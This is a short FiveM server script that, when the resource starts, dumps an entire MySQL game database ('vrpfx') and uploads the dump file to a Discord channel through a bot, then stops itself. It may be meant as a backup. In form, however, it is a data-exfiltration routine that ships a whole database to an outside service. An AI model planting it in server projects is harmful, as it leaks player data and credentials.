const mysqldump = require('mysqldump');
const Discord = require("discord.js");
const fs = require('fs');
const { v4: uuidv4 } = require('uuid');
const scriptid = `saltshani1-${uuidv4()}`;
const channelID = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX';//change here channel id
const token = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'//discord bot token
const client = new Discord.Client({
  partials: ["CHANNEL"],
  intents: ["GUILDS", "GUILD_MESSAGES", "DIRECT_MESSAGES", "GUILD_MEMBERS"],
});


on("onResourceStart", async(resourceName) => {
    if(GetCurrentResourceName() != resourceName) {
      return;
    }
    const result = mysqldump({
      connection: {
          host: "localhost",//change here
          user: "root",//change here
          password: "",//change here
          database: "vrpfx",//change here
      },
      dumpToFile: `cache/${scriptid}.sql`,
  });
  client.on('ready', async(client) =>{
    const channel = await client.channels.fetch(channelID);
                  setTimeout(() => {
                    channel.send({
                      files: [
                        `cache/${scriptid}.sql`
                      ]
                    })
                  }, 1000);
                  console.log("saved");
                  StopResource(GetCurrentResourceName())
                  client.user.setPresence({
                    activities: [{
                      name: "MYSQL",
                      type: "WATCHING"
                    }],
                    status: "dnd"
                  })
}) 
    console.log(`^1
                     __    __               __                            __    __   
                    /  |  /  |             /  |                          /  | _/  |  
  _______   ______  $$ | _$$ |_    _______ $$ |____    ______   _______  $$/ / $$ |  
 /       | /      \ $$ |/ $$   |  /       |$$      \  /      \ /       \ /  |$$$$ |  
/$$$$$$$/  $$$$$$  |$$ |$$$$$$/  /$$$$$$$/ $$$$$$$  | $$$$$$  |$$$$$$$  |$$ |  $$ |  
$$      \  /    $$ |$$ |  $$ | __$$      \ $$ |  $$ | /    $$ |$$ |  $$ |$$ |  $$ |  
 $$$$$$  |/$$$$$$$ |$$ |  $$ |/  |$$$$$$  |$$ |  $$ |/$$$$$$$ |$$ |  $$ |$$ | _$$ |_ 
/     $$/ $$    $$ |$$ |  $$  $$//     $$/ $$ |  $$ |$$    $$ |$$ |  $$ |$$ |/ $$   |
$$$$$$$/   $$$$$$$/ $$/    $$$$/ $$$$$$$/  $$/   $$/  $$$$$$$/ $$/   $$/ $$/ $$$$$$/ `)
  });
  

client.login(token)

